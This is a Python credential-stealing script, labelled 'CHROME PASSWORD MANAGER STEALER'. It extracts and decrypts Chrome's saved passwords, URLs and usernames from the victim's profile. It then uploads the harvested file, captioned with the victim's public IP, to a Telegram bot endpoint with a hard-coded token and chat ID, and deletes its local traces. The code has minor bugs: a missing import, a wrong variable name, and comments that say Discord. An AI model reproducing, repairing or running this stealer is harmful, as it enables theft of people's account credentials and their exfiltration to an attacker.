#CHROME PASSWORD MANAGER STEALER
#CREATED BY CYBERSEL
#INSERT DISCORD WEBHOOK AT LINE 37

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import requests
import getpass

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        print(f"Failed to decrypt password: {e}")
        return ""
def get_ips():
    try:
        public_ip = requests.get("http://ipinfo.io/ip", timeout=5).text.strip()
    except:
        public_ip = "Unknown"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "Unknown"
    return public_ip, local_ip
def main():
    TOKEN = "7733366488:AAHFBq_N1Ix-DFnzbw7nIrc_TDxZYo_hJME"
    webhook_url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'
    CHAT_ID = -1002050197092

    
    try:
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                              "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        output_file = f"{getpass.getuser()}_Chrome_Passwords.txt"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
       
        with open(output_file, "w", encoding="utf-8") as f:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
               
                if username or password:
                    f.write(f"Origin URL: {origin_url}\n")
                    f.write(f"Action URL: {action_url}\n")
                    f.write(f"Username: {username}\n")
                    f.write(f"Password: {password}\n")
                if date_created != 86400000000 and date_created:
                    f.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
                if date_last_used != 86400000000 and date_last_used:
                    f.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
                f.write("="*50 + "\n")
       
        cursor.close()
        db.close()
        ip,_ = get_ips()
        # Send the file to the Discord webhook
        with open(output_file, "rb") as f:
            files = {'document': (f.name, f)}
            data = {'chat_id': CHAT_ID,'caption': f'HIT FROM {ip}'}

            response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                print("File successfully sent to the webhook.")
            else:
                print(f"Failed to send file to the webhook. Status code: {response.status_code}")
   
    except Exception as e:
        print(f"An error occurred: {e}")
   
    finally:
        try:
            os.remove(filename)
            os.remove(output_file)
        except Exception as e:
            print(f"Failed to remove file: {e}")

if __name__ == "__main__":
    main()
